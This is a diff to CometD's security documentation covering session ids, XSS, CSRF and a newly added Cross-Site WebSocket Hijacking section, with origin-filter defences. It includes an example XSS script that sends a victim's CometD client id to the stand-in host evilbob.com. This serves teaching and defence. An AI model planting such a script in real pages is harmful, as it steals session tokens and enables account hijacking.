@@ -6,7 +6,7 @@ This session discusses the security features of the Bayeux Protocol and the
 relationship with common attacks and how you can configure CometD to tighten
 your application.
 
-=== Security of the session id
+=== Security of the CometD session id
 
 The Bayeux Protocol identifies a particular session (formerly known as "client")
 via a session id token, carried in Bayeux messages by the `clientId` field.
@@ -37,7 +37,7 @@ encrypted end-to-end and a man-in-the-middle cannot look or otherwise retrieve
 someone else's session id.
 
 [[_security_xss]]
-=== Security against cross-site scripting (XSS) attacks
+=== Security against Cross-Site Scripting (XSS) attacks
 
 A https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)[cross-site scripting attack]
 is a particularly important vulnerability of web applications.
@@ -53,7 +53,7 @@ Bob sends an evil chat message text to Alice where the text is the following:
 ----
 <script type="text/javascript">
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://evilbob.com?stolen=" + $.cometd.getClientId());
+xhr.open("GET", "https://evilbob.com?stolen=" + $.cometd.getClientId());
 xhr.send();
 </script>
 ----
@@ -135,7 +135,7 @@ This is controlled by the `requireHandshakePerConnection` parameter, see
 <<_java_server_configuration>>.
 
 [[_security_csrf]]
-=== Security against cross site request forgery (CSRF) attacks
+=== Security against Cross Site Request Forgery (CSRF) attacks
 
 A https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)[cross site request forgery attack]
 is a particularly important vulnerability of web applications.
@@ -149,14 +149,14 @@ text is the following:
 ====
 [source,html]
 ----
-Look at this: http://evilbob.com/cometd
+Look at this: https://evilbob.com/cometd
 ----
 ====
 
-Alice clicks on the link, her browser opens a new tab to `+http://evilbob.com/cometd+`
+Alice clicks on the link, her browser opens a new tab to `+https://evilbob.com/cometd+`
 and an entertaining HTML page containing a script is downloaded to Alice's browser.
 
-While Alice is looking at Bob's entertaining page, her browser runs the script,
+While Alice is looking at Bob's entertaining page, her browser runs an evil script,
 which may perform actions on behalf of Alice on the chat service that uses CometD.
 
 For example, Bob could use <<_security_xss,XSS>> to steal Alice's session id and
@@ -176,17 +176,17 @@ therefore will have the following HTTP header:
 ====
 [source]
 ----
-Origin: http://cometd-chat.com
+Origin: https://cometd-chat.com
 ----
 ====
 
-Conversely, Bob's evil script is downloaded from `+http://evilbob.com+` and his
+Conversely, Bob's evil script is downloaded from `+https://evilbob.com+` and his
 evil messages will have the following HTTP header:
 
 ====
 [source]
 ----
-Origin: http://evilbob.com
+Origin: https://evilbob.com
 ----
 ====
 
@@ -200,3 +200,44 @@ denied.
 The unsuccessful preflight response instructs the browser that the script
 cannot perform any request to that target origin, and the browser will
 block the script from making requests to the target domain.
+
+[[_security_cswsh]]
+=== Security against Cross-Site WebSocket Hijacking (CSWSH) attacks
+
+Cross-Site WebSocket Hijacking (CSWSH) is a variant of
+<<_security_csrf,Cross-Site Request Forgery>> but for the WebSocket protocol.
+
+Similarly to CSRF, Bob tricks Alice to look at a page at
+`+https://evilbob.com/cometd+` that downloads an evil script that opens a
+WebSocket connection to `+https://cometd-chat.com+` _from Alice's browser_.
+
+A WebSocket connection sends an initial HTTP request to the server.
+This initial HTTP request, triggered by Bob's evil script running in Alice's
+browser, looks like this:
+
+====
+[source]
+----
+GET /cometd HTTP/1.1
+Upgrade: websocket
+...
+Cookie: BAYEUX_BROWSER=...; JSESSIONID=...
+...
+Origin: https://evilbob.com
+----
+====
+
+The initial HTTP request will have Alice's cookies (and possibly Alice's
+authentication headers), including the CometD cookie and the HTTP session
+cookie.
+However, it will have `+Origin: https://evilbob.com+` and not the expected
+`+Origin: https://cometd-chat.com+`.
+
+As with the CSRF attack, the application at `cometd-chat.com` can install the
+cross-origin filter and configure it to allow requests only from the
+`cometd-chat.com` origin, effectively blocking Bob's CSWSH attack.
+
+In this case, the cross-origin filter must be installed _before_ the
+WebSocket upgrade mechanism takes place, or the WebSocket upgrade mechanism
+must have a way to test against a configured list of allowed origins and
+reject the WebSocket connection attempt if the origin is not allowed.
